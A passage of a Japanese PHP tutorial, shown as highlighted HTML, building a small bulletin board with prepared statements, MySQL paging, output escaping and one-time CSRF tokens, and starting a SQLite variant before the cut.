                <span class="s1">'VALUES(?, ?, ?, ?)'</span><span class="p">,</span>
            <span class="p">)));</span>
            <span class="c1">// 書き込みを実行</span>
            <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
                <span class="nv">$name</span><span class="p">,</span>
                <span class="nv">$email</span><span class="p">,</span>
                <span class="nv">$text</span><span class="p">,</span>
                <span class="nb">date</span><span class="p">(</span><span class="s1">'Y-m-d H:i:s'</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_TIME'</span><span class="p">])</span>
            <span class="p">));</span>
            <span class="c1">// セッションに時間を記録し、メッセージをセット</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'prev'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_TIME'</span><span class="p">];</span>
            <span class="c1">// フォームの投稿内容をリセットする</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'text'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
            <span class="c1">// 正しい処理を行ったが、形式上例外としてスロー</span>
            <span class="k">throw</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'書き込みました'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="c1">// プリペアドステートメントを生成</span>
    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nb">implode</span><span class="p">(</span><span class="s1">' '</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'SELECT'</span><span class="p">,</span>
        <span class="s1">'SQL_CALC_FOUND_ROWS `name`, `email`, `text`, `time`'</span><span class="p">,</span>
        <span class="s1">'FROM mini_board'</span><span class="p">,</span>
        <span class="s1">'ORDER BY `id` DESC'</span><span class="p">,</span>
        <span class="s1">'LIMIT ?, ?'</span><span class="p">,</span>
    <span class="p">)));</span>
    <span class="c1">// 値をバインド</span>
    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="nv">$page</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="nx">DISP_MAX</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>
    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nx">DISP_MAX</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>
    <span class="c1">// 読み出しを実行</span>
    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
    <span class="c1">// ページ番号にあった分だけ取り出す</span>
    <span class="nv">$articles</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetchAll</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">);</span>
    <span class="c1">// 現在のページの件数をセット</span>
    <span class="nv">$current_count</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$articles</span><span class="p">);</span>
    <span class="c1">// 総件数をセット</span>
    <span class="nv">$whole_count</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">'SELECT FOUND_ROWS()'</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">fetchColumn</span><span class="p">();</span>
    <span class="c1">// 総ページ数をセット</span>
    <span class="nv">$page_count</span> <span class="o">=</span> <span class="nb">ceil</span><span class="p">(</span><span class="nv">$whole_count</span> <span class="o">/</span> <span class="nx">DISP_MAX</span><span class="p">);</span>

<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span> <span class="p">}</span>

<span class="cm">/* ワンタイムトークンを次の投稿のために準備 */</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_slice</span><span class="p">(</span>
    <span class="k">array</span><span class="p">(</span><span class="nv">$token</span> <span class="o">=</span> <span class="nb">sha1</span><span class="p">(</span><span class="nb">mt_rand</span><span class="p">())</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">],</span>
    <span class="mi">0</span><span class="p">,</span>
    <span class="nx">TOKEN_MAX</span>
<span class="p">);</span>

<span class="cm">/* ヘッダー送信 */</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/xhtml+xml; charset=utf-8'</span><span class="p">);</span>

<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">"http://www.w3.org/1999/xhtml"</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>ミニ掲示板<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">style</span> <span class="na">type</span><span class="o">=</span><span class="s">"text/css"</span><span class="p">&gt;</span><span class="o">&lt;![</span><span class="nt">CDATA</span><span class="o">[</span>
    <span class="o">&lt;!</span><span class="nt">--</span>
    <span class="p">#</span><span class="nn">wrapper</span> <span class="p">{</span>
      <span class="k">width</span><span class="p">:</span> <span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">#</span><span class="nn">header</span><span class="o">,</span> <span class="p">#</span><span class="nn">container</span><span class="o">,</span> <span class="p">#</span><span class="nn">footer</span> <span class="p">{</span>
      <span class="k">width</span><span class="p">:</span> <span class="mi">650</span><span class="kt">px</span><span class="p">;</span>
      <span class="k">margin</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span> <span class="kc">auto</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">#</span><span class="nn">header</span><span class="o">,</span> <span class="p">#</span><span class="nn">footer</span> <span class="p">{</span>
      <span class="k">text-align</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">#</span><span class="nn">messages</span><span class="o">,</span> <span class="p">#</span><span class="nn">textarea</span><span class="o">,</span> <span class="p">#</span><span class="nn">articles</span> <span class="p">{</span>
      <span class="k">width</span><span class="p">:</span> <span class="mi">550</span><span class="kt">px</span><span class="p">;</span>
      <span class="k">margin</span><span class="p">:</span> <span class="mi">-3</span><span class="kt">px</span> <span class="kc">auto</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
      <span class="k">border-top</span><span class="p">:</span> <span class="mi">3</span><span class="kt">px</span> <span class="kc">double</span> <span class="kc">brown</span><span class="p">;</span>
      <span class="k">padding</span><span class="p">:</span> <span class="mi">28</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">#</span><span class="nn">articles</span> <span class="p">{</span> 
      <span class="k">overflow</span><span class="p">:</span> <span class="kc">hidden</span><span class="p">;</span>
      <span class="k">padding-top</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">.</span><span class="nc">article</span> <span class="p">{</span>
      <span class="k">margin-top</span><span class="p">:</span> <span class="mi">-1</span><span class="kt">px</span><span class="p">;</span>
      <span class="k">border-top</span><span class="p">:</span> <span class="mi">1</span><span class="kt">px</span> <span class="kc">dotted</span> <span class="kc">brown</span><span class="p">;</span>
      <span class="k">padding</span><span class="p">:</span> <span class="mi">19</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">.</span><span class="nc">article_name</span> <span class="p">{</span>
      <span class="k">font-size</span><span class="p">:</span> <span class="mi">27</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">.</span><span class="nc">article_text</span> <span class="p">{</span>
      <span class="k">margin</span><span class="p">:</span> <span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">.</span><span class="nc">article_time</span> <span class="p">{</span>
      <span class="k">text-align</span><span class="p">:</span> <span class="kc">right</span><span class="p">;</span>
      <span class="k">font-size</span><span class="p">:</span> <span class="mi">11</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">.</span><span class="nc">page</span> <span class="p">{</span>
      <span class="k">font-size</span><span class="p">:</span> <span class="mi">11</span><span class="kt">px</span><span class="p">;</span>
      <span class="k">text-align</span><span class="p">:</span> <span class="kc">right</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nt">body</span> <span class="p">{</span>
      <span class="k">background</span><span class="p">:</span> <span class="kc">antiquewhite</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nt">h1</span> <span class="p">{</span>
      <span class="k">color</span><span class="p">:</span> <span class="kc">fuchsia</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nt">textarea</span> <span class="p">{</span>
      <span class="k">width</span><span class="p">:</span> <span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
      <span class="k">height</span><span class="p">:</span> <span class="mi">150</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nt">label</span> <span class="p">{</span>
      <span class="k">display</span><span class="p">:</span> <span class="kc">block</span><span class="p">;</span>
      <span class="k">margin</span><span class="p">:</span> <span class="mi">10</span><span class="kt">px</span> <span class="mi">10</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nt">--</span><span class="o">&gt;</span>
 <span class="o">]]&gt;</span><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"wrapper"</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"header"</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>～ミニ掲示板～<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"container"</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"textarea"</span><span class="p">&gt;</span>
          <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">""</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>名前: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"name"</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">value</span><span class="o">=</span><span class="s">"</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="s">"</span> <span class="p">/&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>Eメール: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"email"</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">value</span><span class="o">=</span><span class="s">"</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="s">"</span> <span class="p">/&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>本文<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">textarea</span> <span class="na">name</span><span class="o">=</span><span class="s">"text"</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'text'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">textarea</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">label</span> <span class="na">style</span><span class="o">=</span><span class="s">"text-align:right;"</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">name</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"投稿"</span> <span class="p">/&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"token"</span> <span class="na">value</span><span class="o">=</span><span class="s">"</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$token</span><span class="p">)</span><span class="cp">?&gt;</span><span class="s">"</span> <span class="p">/&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
          <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$e</span><span class="p">))</span><span class="o">:</span> <span class="cp">?&gt;</span>
        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"messages"</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">foreach</span> <span class="p">(</span><span class="nx">exception_to_array</span><span class="p">(</span><span class="nv">$e</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$msg</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
          <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endforeach</span><span class="p">;</span> <span class="cp">?&gt;</span>
        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$articles</span><span class="p">))</span><span class="o">:</span> <span class="cp">?&gt;</span>
        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"articles"</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$articles</span> <span class="k">as</span> <span class="nv">$article</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
          <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"article"</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"article_name"</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"mailto:</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$article</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="s">"</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$article</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"article_text"</span><span class="p">&gt;&lt;</span><span class="nt">pre</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$article</span><span class="p">[</span><span class="s1">'text'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">pre</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"article_time"</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$article</span><span class="p">[</span><span class="s1">'time'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
          <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endforeach</span><span class="p">;</span> <span class="cp">?&gt;</span>
        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"footer"</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$page</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
          <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"?page=</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$page</span><span class="o">-</span><span class="mi">1</span><span class="cp">?&gt;</span><span class="s">"</span><span class="p">&gt;</span>前<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span> | 
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
          <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"?"</span><span class="p">&gt;</span>最新<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$page_count</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$page</span> <span class="o">&lt;</span> <span class="nv">$page_count</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
           | <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"?page=</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$page</span><span class="o">+</span><span class="mi">1</span><span class="cp">?&gt;</span><span class="s">"</span><span class="p">&gt;</span>次<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">"page"</span><span class="p">&gt;</span><span class="cp">&lt;?php</span>
          <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$current_count</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s1">'まだ書き込みはありません'</span><span class="p">;</span>
          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nb">printf</span><span class="p">(</span><span class="s1">'%d件中%d件目～%d件目(%dページ中%dページ目)を表示中'</span><span class="p">,</span>
              <span class="nv">$whole_count</span><span class="p">,</span>
              <span class="p">(</span><span class="nv">$tmp</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$page</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="nx">DISP_MAX</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span>
              <span class="nv">$tmp</span> <span class="o">+</span> <span class="nv">$current_count</span><span class="p">,</span>
              <span class="nv">$page_count</span><span class="p">,</span>
              <span class="nv">$page</span>
            <span class="p">);</span>
          <span class="p">}</span>
        <span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div></div>

<h3>
<span id="工夫していること" class="fragment"></span><a href="#%E5%B7%A5%E5%A4%AB%E3%81%97%E3%81%A6%E3%81%84%E3%82%8B%E3%81%93%E3%81%A8"><i class="fa fa-link"></i></a>工夫していること</h3>

<ul>
<li>例外をスタックを用いて処理している。</li>
<li>ページング処理に <strong>LIMIT句</strong>, <strong>SQL_CALC_FOUND_ROWSオプション</strong>, <strong>FOUND_ROWS関数</strong><br>
を活用して、件数が増えても可能な限り負荷がかからないようにしている。</li>
<li>ワンタイムトークンを用いてCSRF攻撃や連投を簡易的に防いでいる。<br>
厳密にするにはIPアドレスでの判断を行うことになるが、ここでは割愛。</li>
</ul>

<h2>
<span id="関連" class="fragment"></span><a href="#%E9%96%A2%E9%80%A3"><i class="fa fa-link"></i></a>関連</h2>

<h3>
<span id="_get-_postなどを受け取る際の処理" class="fragment"></span><a href="#_get-_post%E3%81%AA%E3%81%A9%E3%82%92%E5%8F%97%E3%81%91%E5%8F%96%E3%82%8B%E9%9A%9B%E3%81%AE%E5%87%A6%E7%90%86"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/2f9955db1c02eeef43ea" id="reference-8255bebb89c0e2b97618">$_GET, $_POSTなどを受け取る際の処理</a>
</h3>

<h3>
<span id="シリアル版-ページング処理を採り入れた掲示板サンプル" class="fragment"></span><a href="#%E3%82%B7%E3%83%AA%E3%82%A2%E3%83%AB%E7%89%88-%E3%83%9A%E3%83%BC%E3%82%B8%E3%83%B3%E3%82%B0%E5%87%A6%E7%90%86%E3%82%92%E6%8E%A1%E3%82%8A%E5%85%A5%E3%82%8C%E3%81%9F%E6%8E%B2%E7%A4%BA%E6%9D%BF%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/e7f3f60b687053b7832a" id="reference-18ec8c54830c5151a0fb">[シリアル版] ページング処理を採り入れた掲示板サンプル</a>
</h3>

<h3>
<span id="phpでデータベースに接続するときのまとめ" class="fragment"></span><a href="#php%E3%81%A7%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AB%E6%8E%A5%E7%B6%9A%E3%81%99%E3%82%8B%E3%81%A8%E3%81%8D%E3%81%AE%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/b00b72c5c95aac573b71" id="reference-d7658556d29eda1fab9a">PHPでデータベースに接続するときのまとめ</a>
</h3>

<h3>
<span id="まとめて例外をスローする小技" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81%E3%81%A6%E4%BE%8B%E5%A4%96%E3%82%92%E3%82%B9%E3%83%AD%E3%83%BC%E3%81%99%E3%82%8B%E5%B0%8F%E6%8A%80"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/6bd99ff62571c02feaa1" id="reference-c2ec49203e856dbc761e">まとめて例外をスローする小技</a>
</h3>

<h1>
<span id="おまけsqlite編" class="fragment"></span><a href="#%E3%81%8A%E3%81%BE%E3%81%91sqlite%E7%B7%A8"><i class="fa fa-link"></i></a>おまけ(SQLite編)</h1>

<p>SQLiteではMySQLに存在しているようなページング処理用の機能を使うことが出来ないので、もう一度LIMIT句無しで全件をSELECTするしか方法が無い。尤も、これでもSQLiteでアクセスが捌ききれるような規模の掲示板であれば、もともとの構造の違いもあってMySQLよりも高速に動作することが期待できる。</p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="cm">/* 設定 */</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'DB_DSN'</span><span class="p">,</span> <span class="s1">'sqlite:./test.db'</span><span class="p">);</span>    <span class="c1">// DSN(Data Source Name)</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'SESSION_NAME'</span><span class="p">,</span> <span class="s1">'MiniBoard'</span><span class="p">);</span>     <span class="c1">// セッションクッキーに用いる名前</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'DISP_MAX'</span><span class="p">,</span>  <span class="mi">10</span><span class="p">);</span>                 <span class="c1">// 1ページの最大表示数</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'LIMIT_SEC'</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>                  <span class="c1">// 連続投稿を禁止する秒数</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'TOKEN_MAX'</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>                 <span class="c1">// ワンタイムトークン蓄積最大数</span>
<span class="nb">date_default_timezone_set</span><span class="p">(</span><span class="s1">'Asia/Tokyo'</span><span class="p">);</span> <span class="c1">// タイムゾーン</span>
<span class="nb">mb_internal_encoding</span><span class="p">(</span><span class="s1">'UTF-8'</span><span class="p">);</span>           <span class="c1">// 内部エンコーディング</span>

<span class="sd">/**</span>
<span class="sd"> * HTML特殊文字をエスケープする関数</span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">h</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>

<span class="sd">/**</span>
<span class="sd"> * RuntimeExceptionを生成する関数</span>
<span class="sd"> * http://qiita.com/mpyw/items/6bd99ff62571c02feaa1</span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">e</span><span class="p">(</span><span class="nv">$msg</span><span class="p">,</span> <span class="nx">Exception</span> <span class="o">&amp;</span><span class="nv">$previous</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="nv">$msg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$previous</span><span class="p">);</span>
<span class="p">}</span>

<span class="sd">/**</span>
<span class="sd"> * 例外スタックのメッセージ部分を配列に変換する関数</span>
<span class="sd"> * http://qiita.com/mpyw/items/6bd99ff62571c02feaa1</span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">exception_to_array</span><span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">do</span> <span class="p">{</span>
        <span class="nv">$msgs</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$e</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getPrevious</span><span class="p">());</span>
    <span class="k">return</span> <span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$msgs</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/* 変数の初期化 */</span>
<span class="c1">// リクエストパラメータをトリミングした後展開</span>
<span class="k">foreach</span> <span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'name'</span><span class="p">,</span> <span class="s1">'email'</span><span class="p">,</span> <span class="s1">'text'</span><span class="p">,</span> <span class="s1">'token'</span><span class="p">,</span> <span class="s1">'page'</span><span class="p">,</span> <span class="s1">'submit'</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
